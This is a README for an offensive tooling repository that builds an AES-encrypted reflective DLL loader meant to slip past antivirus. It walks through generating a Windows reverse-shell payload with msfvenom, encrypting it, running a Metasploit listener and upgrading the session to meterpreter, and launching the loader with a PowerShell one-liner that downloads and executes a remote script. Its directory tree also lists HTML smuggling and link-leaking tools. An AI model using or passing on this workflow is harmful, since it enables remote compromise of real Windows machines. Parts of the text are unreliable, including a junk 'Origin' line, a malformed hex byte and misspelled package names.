# ReflectiveDll

The ReflectiveDLL injection concept here was developed by Sektor7 malware development intermediate course and used plenty of code from Stephen Fewer and his repository.

I have fix some bugs on the reflectiondll code.

**Disclaimer: While reflectiondll is an old technique its possible to be catch against the new AV and XDR.**

## Origin

l0c0b0b0_!0X#$%>

## Installation

Several functions and API may need to be installed default deppendencies of Windows OS, compile with Visual Studio all the files:

### Python3

aes.py requires the usage of Python3.8+ and pip, which can be installed on any Linux using the following commands:

```bash
python3 -m pip install Crypto --break-system-packages
python3 -m pip install pycryto --break-system-packages
python3 -m pip install pycryptomode --break-system-packages
```

## Usage

[1] Create payload reverse shell (binary/raw) file:

```bash
msfvenom --platform windows --arch x64  -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=1234 EXITFUNC=thread -f raw -o revshell.bin
```

[2] Encrypt the reverse shell binary (revshell.bin) file with aes.py script:

```bash
python3 aes.py revshell.bin
OutPut:
AESkey[] = { 0x7c, 0x58, 0x12, 0xf7, 0x93, 0xad, 0x69, 0x9a, 0xfd, 0x85, 0xe2, 0xd4, 0xbe, 0x28, 0xa0, 0x55 };
payload[] = { 0x34, 0x70, 0x35, 0x11, 0x1b, 0xd5, 0x0, 0x1e, 0x83, 0x49, 0x82, 0x65, 0x9e, 0xa8, 0x5a, 0xc4, 0x49, 0x38, ....., 0x33 };
```

[3] Reemplace the hexadecimal payload and key into #reflectivedll/src/ReflectiveDll.c file (line:39,40), compile on Visual Studio.
(OutputFile: reflectivedll\x64\Release\cObO.x64.dll)

[4] Encrypt the cObO.x64.dll file with aes.py script:

```bash
python3 aes.py cObO.x64.dll
OutPut:
AESkey[] = { 0x1c, 0x51, 0x11, 0xa7, 0x93, 0xad, 0x69, 0x9a, 0xfd, 0x85, 0xe2, 0xd4, 0xbe, 0x28, 0xa0, 0x55 };
payload[] = { 0x11, 0x50, 0x35, 0x45, 0x1b, 0xd5, 0x0, 0x1e, 0x83, 0x49, 0x82, x9a, 0xfd, 0x85, 0xe2, 0xd4, 0xbe, 0xf7, 0x93, 0xad, 0x69, 0x9a, ....., 0x19 };
```
[5] Reemplace the hexadecimal payload and key into #reflectiveloader/src/main.cpp file (line:140,141), compile on Visual Studio.
(OutputFile: reflectiveloader\x64\Debug\bOlO.exe)

[6] Listener C2 Metasploit

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST 10.10.10.10
set LPORT 1234
set ExitOnSession false
exploit -j -z
```
After get a session elevate to meterpreter:

```bash
msf6 exploit/multi/handler>  session -u 1
```
[7] Trigger reflective Loader

```bash
ps> iex (new-object net.webclient).downloadstring('http://10.10.10.10:8443/tools/ex.ps1')"
```

### Directory Tree

By default, results will be stored in the ./recon directory. A new sub directory is created for every target. The structure of this sub directory is:

```
.
./reflectivedll
├── cObO.sln
├── cObO.vcproj
├── cObO.vcxproj
├── cObO.vcxproj.filters
├── cObO.vcxproj.user
└── src
    ├── ReflectiveDll.c
    ├── ReflectiveDLLInjection.h
    ├── ReflectiveLoader.c
    └── ReflectiveLoader.h
./reflectiveloader
├── bOlO.sln
├── bOlO.vcxproj
├── bOlO.vcxproj.filters
├── bOlO.vcxproj.user
└── src
    └── main.cpp
./tools
├── cipherpayload
│   └── aes.py
├── htmlsmuggling
│   ├── smuggling.py
│   ├── source.c
│   └── template.html
├── iexpress
│   ├── readme.txt
│   └── winrar.SED
├── leaklink
│   ├── leaklink.py
│   └── readme.txt
└── triggers
    ├── ex.ps1
    ├── oneline.txt
    └── readme.txt
